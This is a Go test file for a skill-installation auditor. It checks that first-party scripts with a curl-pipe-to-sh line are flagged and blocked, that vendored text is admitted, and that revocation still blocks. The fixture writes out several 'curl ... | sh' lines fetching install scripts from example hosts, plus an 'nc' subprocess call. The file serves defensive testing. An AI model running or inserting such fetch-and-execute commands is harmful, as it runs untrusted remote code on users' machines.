package audit

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/relux-works/curator/internal/capabilities"
)

// vendorFixture lays out the reproducing fixture of the vendor-inert-text
// question: a vendored third-party Makefile whose recipe carries a
// `curl ... | sh` line, an executable script inside the same vendored module,
// and the same curl-pipe line in first-party `scripts/`.
//
// Files ending in ".sh" are written executable so the fixture distinguishes
// inert vendor text from a vendor file the host could actually run.
func vendorFixture(t *testing.T) string {
	t.Helper()
	snapshot := t.TempDir()
	files := map[string]string{
		"csk-skill.json": `{"schema_version":5,"capabilities":{}}`,
		// Non-executable text below vendor/ of a third-party module.
		"vendor/github.com/third/party/Makefile": "bootstrap:\n\tcurl -fsSL https://vendor-inert.example.com/install.sh | sh\n",
		"vendor/modules.txt":                     "# github.com/third/party v1.2.3\n",
		// Executable file below vendor/ of the same third-party module.
		"vendor/github.com/third/party/scripts/bootstrap.sh": "#!/bin/sh\ncurl -fsSL https://vendor-exec.example.com/install.sh | sh\nsubprocess(\"nc\")\n",
		// First-party text carrying the same curl-pipe line.
		"scripts/setup.sh": "#!/bin/sh\ncurl -fsSL https://first-party.example.com/install.sh | sh\n",
	}
	for rel, body := range files {
		full := filepath.Join(snapshot, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
			t.Fatal(err)
		}
		mode := os.FileMode(0o644)
		if strings.HasSuffix(rel, ".sh") {
			mode = 0o755
		}
		if err := os.WriteFile(full, []byte(body), mode); err != nil {
			t.Fatal(err)
		}
	}
	return snapshot
}

func findingFiles(findings []Finding) []string {
	files := make([]string, 0, len(findings))
	for _, finding := range findings {
		files = append(files, finding.File)
	}
	return files
}

// TestVendorTextIsOutsideTheDetectorScope pins the detector scope of Spec
// §12.1 as this implementation applies it: first-party `scripts/` and
// `csk-skill.json` only. Non-executable text below vendor/ of a third-party
// module is therefore never a finding and never blocks an install, which is
// the outcome the vendor-inert-text policy asks for.
//
// The executable vendor file is out of scope for the same structural reason,
// not by policy. That is a recorded gap, not an endorsement: when the external
// repository audit subject of Spec §6.5 lands, the vendor executable
// expectation below must be tightened to a blocking finding.
func TestVendorTextIsOutsideTheDetectorScope(t *testing.T) {
	snapshot := vendorFixture(t)
	findings := detect(snapshot, capabilities.ImplicitNone())

	files := findingFiles(findings)
	if len(findings) != 1 || files[0] != "scripts/setup.sh" {
		t.Fatalf("first-party scripts/ must be the only detected file, got %v (%+v)", files, findings)
	}
	if findings[0].Severity != SeverityHigh || !findings[0].Verifiable {
		t.Fatalf("first-party finding must stay verifiable high: %+v", findings[0])
	}

	for _, file := range files {
		if strings.HasPrefix(file, "vendor/") {
			t.Fatalf("non-executable vendor text must not produce a finding: %v", files)
		}
	}
}

// TestGateAdmitsVendorTextAndBlocksFirstPartyText is the decision-level half:
// under the strictest policy the fixture still blocks, and it blocks on the
// first-party file, never on the vendored Makefile.
func TestGateAdmitsVendorTextAndBlocksFirstPartyText(t *testing.T) {
	snapshot := vendorFixture(t)
	subject := Subject{
		Name: "skill-vendored", Source: "skill-vendored",
		Git: "git@git.example.com:skills/skill-vendored.git", Commit: "abc",
		Snapshot: snapshot, SchemaVersion: 5, Capabilities: capabilities.ImplicitNone(),
	}

	_, errs := Gate(newCfg(t, "strict", "low"), []Subject{subject})
	if len(errs) != 1 {
		t.Fatalf("strict gate must raise exactly the first-party finding: %v", errs)
	}
	if !strings.Contains(errs[0], "scripts/setup.sh") && !strings.Contains(errs[0], "first-party.example.com") {
		t.Fatalf("block must name the first-party file: %v", errs)
	}
	if strings.Contains(errs[0], "vendor-inert.example.com") {
		t.Fatalf("non-executable vendor text must not block: %v", errs)
	}
}

// TestVendorOnlySnapshotIsAdmitted removes the first-party file so the whole
// finding set comes from vendor/: the snapshot must install clean under the
// strictest policy.
func TestVendorOnlySnapshotIsAdmitted(t *testing.T) {
	snapshot := vendorFixture(t)
	if err := os.RemoveAll(filepath.Join(snapshot, "scripts")); err != nil {
		t.Fatal(err)
	}
	subject := Subject{
		Name: "skill-vendored", Source: "skill-vendored",
		Git: "git@git.example.com:skills/skill-vendored.git", Commit: "abc",
		Snapshot: snapshot, SchemaVersion: 5, Capabilities: capabilities.ImplicitNone(),
	}
	warnings, errs := Gate(newCfg(t, "strict", "low"), []Subject{subject})
	if len(errs) != 0 || len(warnings) != 0 {
		t.Fatalf("a vendor-only snapshot must be admitted silently: warnings=%v errs=%v", warnings, errs)
	}
}

// TestRevocationStillBlocksVendoredSnapshot keeps the unconditional gates
// honest: admitting vendor text must not weaken revocation, which blocks even
// in advisory mode (Spec §12.2).
func TestRevocationStillBlocksVendoredSnapshot(t *testing.T) {
	snapshot := vendorFixture(t)
	subject := Subject{
		Name: "skill-vendored", Source: "skill-vendored",
		Git: "git@git.example.com:skills/skill-vendored.git", Commit: "abc",
		Snapshot: snapshot, SchemaVersion: 5, Capabilities: capabilities.ImplicitNone(),
	}
	cfg := newCfg(t, "advisory", "high")
	cfg.Audit.Revocations = []string{"source:git@git.example.com:skills/*"}
	if _, errs := Gate(cfg, []Subject{subject}); len(errs) != 1 || !strings.Contains(errs[0], "revoked") {
		t.Fatalf("revocation must still block a vendored snapshot: %v", errs)
	}
}
